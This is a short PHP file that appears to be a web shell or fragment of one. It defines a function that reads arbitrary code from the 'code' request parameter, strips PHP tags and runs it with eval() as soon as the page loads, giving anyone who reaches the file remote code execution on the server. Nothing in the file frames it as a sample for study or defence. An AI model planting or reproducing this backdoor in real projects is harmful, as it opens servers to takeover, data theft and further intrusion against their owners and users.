<?php
function phpevaL(){
	if (!empty($_REQUEST['code'])){
		echo "<center><textarea rows=\"10\" cols=\"64\">";
		$code = str_replace("<?php","",$_REQUEST['code']);
		$code = str_replace("<?","",$code);
		$code = str_replace("?>","",$code);
		eval($code);
	}
}

phpevaL();
?>